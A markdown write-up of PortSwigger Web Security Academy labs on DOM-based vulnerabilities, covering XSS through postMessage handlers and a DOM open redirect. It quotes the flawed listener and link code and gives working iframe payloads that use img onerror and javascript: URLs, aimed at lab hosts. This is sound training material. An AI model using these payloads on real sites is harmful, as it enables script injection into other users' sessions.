# DOM-based vulnerabilities

- https://portswigger.net/web-security/dom-based

## DOM XSS using web messages

No `X-Frame-Options` header that would prevent loading this page in the `iframe` and additionally event listener preset for `message` event without origin verification that passes the input without sanitization to the `innerHtml` function.

Event listener for `message` event is our source, and `innerHtml` function is the sink.

Deliver below payload to the victim to solve the lab. It will load the victim page as an iframe and on load will post a message to all origins, causing vulnerable `message` event listener trigger.

```
<iframe src="https://0aa600ac04c124c89e1a8aa5009800fc.web-security-academy.net/" style="width: 100%; height: 100%;" frameBorder="0" onload='this.contentWindow.postMessage("<img src=X onerror=\"print()\"/>", "*")'></iframe>
```

## DOM XSS using web messages and a JavaScript URL

Same story as before, but this time `message` event listener tries to check whether provided data is the link and update `location.href` by it.

Unfortunately the code shown below does not check whether the provided data starts with `http:` or `https:`, but only if the data contains one of those strings, so it could be bypassed by providing input `javascript:print();//https:`, which when set to `location.href` executes code and calls `print()`

```
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```

To solve the lab we can deliver `iframe` containing vulnerable page, which onload posts a message which bypasses the `http` schema check and change `location.href` to `javascript:print()` code which calls the `print()` function.  

```
<iframe src="https://0a7200ce03bc3ad48289581c002500f5.web-security-academy.net/" style="width: 100%; height: 100%;" frameBorder="0" onload='this.contentWindow.postMessage("javascript:print();//https:", "*")'></iframe>
```

## DOM XSS using web messages and JSON.parse

Again no origin check and no `X-Frame-Options` type headers.

This time input is provided via json and `JSON.parse` function is called.
On message receival the page would create an `iframe` and depending on `type` key provided it will take different actions. When `type` is set to `load-channel` it sets `url` json value as iframe `src` without any sanitization.

To prove what can be done with it I have created an `iframe` with target website and executed the below command, which proved that when `iframe.src` is set to `javascript:` schema it will execute code. To make sure the code will not be executed in my website context, but in target website context `alert(document.domain)` is called, which proves we execute code in target page context.

```
document.querySelector("iframe").contentWindow.postMessage('{"type":"load-channel","url":"javascript:alert(document.domain)"}', '*')
```

In order to solve the lab we need to make the victim access below page containing vulnerable website in an `iframe` and making apriopriate `postMessage` call causing js execution.

```
<iframe src="https://0a7700ea031731ad82d2bfc000f8002b.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}", "*")'></iframe>
```

## DOM-based open redirection

`Back to blog` link is generated via `onlick` effect, which takes `url` query param without validation and sanitization and passes it to `location.href`. The query will be passed only if param starts with `http`, so it makes using `javascript:` pseudo protocol for code execution unusable.

```
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
```

To solve the lab, we need to access the url with open redirection to exploit server

```
https://0a7f004b034dd93b81637a8000cc00b5.web-security-academy.net/post?postId=7&url=https://exploit-0ad300ad037ad90381cd794e01dc0079.exploit-server.net/
```
